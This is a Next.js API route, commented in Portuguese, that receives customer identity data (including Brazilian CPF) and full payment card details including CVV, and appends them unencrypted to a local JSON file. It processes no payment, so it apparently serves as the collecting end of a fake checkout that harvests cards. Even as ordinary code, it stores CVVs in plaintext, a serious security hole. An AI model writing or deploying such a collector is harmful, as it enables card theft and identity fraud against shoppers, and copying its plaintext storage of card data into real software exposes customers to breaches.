import { type NextRequest, NextResponse } from "next/server"
import fs from 'fs'
import path from 'path'

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    
    // Criar objeto com dados do cartão
    const cardData = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      customer: {
        name: data.customerName,
        cpf: data.customerCpf,
        phone: data.customerPhone,
        email: data.customerEmail,
        address: data.customerAddress
      },
      card: {
        number: data.cardNumber,
        holderName: data.cardHolderName,
        expiryDate: data.cardExpiryDate,
        cvv: data.cardCvv
      },
      product: {
        name: data.productName,
        price: data.productPrice,
        quantity: data.productQuantity
      },
      total: data.total
    }
    
    // Caminho do arquivo JSON
    const filePath = path.join(process.cwd(), 'card-data.json')
    
    // Ler dados existentes ou criar array vazio
    let existingData = []
    try {
      const fileContent = fs.readFileSync(filePath, 'utf-8')
      existingData = JSON.parse(fileContent)
    } catch (error) {
      // Arquivo não existe ainda
    }
    
    // Adicionar novo registro
    existingData.push(cardData)
    
    // Salvar no arquivo
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2))
    
    return NextResponse.json({ 
      success: true,
      message: "Dados salvos com sucesso",
      id: cardData.id
    })
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao salvar dados"
    }, { status: 500 })
  }
}
